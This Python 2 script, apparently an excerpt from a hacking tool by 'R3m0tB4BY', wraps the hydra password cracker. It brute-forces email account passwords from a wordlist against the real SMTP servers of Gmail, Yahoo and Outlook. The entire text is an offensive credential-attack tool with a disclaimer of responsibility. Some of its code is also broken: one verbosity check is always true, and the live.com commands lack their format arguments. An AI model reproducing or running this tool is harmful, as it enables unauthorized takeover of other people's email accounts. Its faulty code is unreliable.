#!/usr/bin/python
"""
this program need wordlist password!!!
aku tidak bertanggung jawab atas apa yg km lakukan!!!
################################################
##########https://Instagram:hadinur27  #########
##########https://www.facebook:hadinurusalam ###
##########https://github.com/hadimin121  #######
################################################
"""
...
print "-----------------------------------------------------"
print "[]xxxxx[]::::::::::::::::::::> 12-07-2018 (**:**)"
print " [*] Author:  R3m0tB4BY ---  [*] Version R3m0tB4BY"
...
if bhydra == '01' or bhydra == '1':
    ...
    if verbose == 'Y' or 'y':
        os.system("hydra -l %s -P %s -V -I -s 465 smtp.gmail.com smtp" % (email, word))
        sys.exit()
    else:
        os.system("hydra -l %s -P %s -I -s 465 smtp.gmail.com smtp" % (email, word))
        sys.exit()
    ...
    if verbose == 'Y' or verbose == 'y':
        os.system("hydra -l %s -P %s -V -I -s 587 smtp.mail.yahoo.com smtp" % (email, word))
        sys.exit()
    elif verbose == 'N' or verbose == 'n':
        os.system("hydra -l %s -P %s -I -s 587 smtp.mail.yahoo.com smtp" % (email, word))
        sys.exit()
    else:
        print "\n[!] ERROR: Wrong Input"
        sys.exit()
    ...
    verbose = raw_input("[*] Verbose? (Y/n): ")
    if verbose == 'Y' or verbose == 'y':
        os.system("hydra -l %s -P %s -V -I -s 587 smtp.live.com smtp")
        sys.exit()
    else:
        os.system("hydra -l %s -P %s -I -s 587 smtp.live.com smtp")
        sys.exit()
